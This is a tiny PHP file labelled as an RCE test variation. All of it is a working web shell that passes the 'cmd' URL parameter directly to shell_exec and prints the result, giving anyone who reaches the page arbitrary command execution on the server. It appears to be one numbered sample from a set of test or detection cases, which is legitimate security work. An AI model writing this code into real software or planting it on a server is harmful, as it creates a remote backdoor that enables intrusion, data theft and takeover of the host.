<?php
// RCE test variation #1129
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>